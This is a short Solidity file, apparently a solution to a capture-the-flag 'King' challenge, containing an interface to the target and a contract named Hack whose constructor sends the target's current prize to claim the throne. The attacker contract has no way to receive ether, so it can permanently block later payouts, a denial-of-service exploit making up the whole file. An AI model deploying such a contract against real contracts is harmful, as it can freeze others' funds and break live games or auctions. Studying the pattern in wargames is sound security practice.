//SPDX-License-Identifier: MIT
pragma solidity^0.8;

interface IKing {
    function prize() external view returns(uint256);
    function _king() external view returns(address);
}

contract Hack{
    constructor(address payable _contractAddress) payable {
        uint256 prize = IKing(_contractAddress).prize();
        (bool sent,) = _contractAddress.call{value: prize}("");
        require(sent,"transaction failed");
    }
}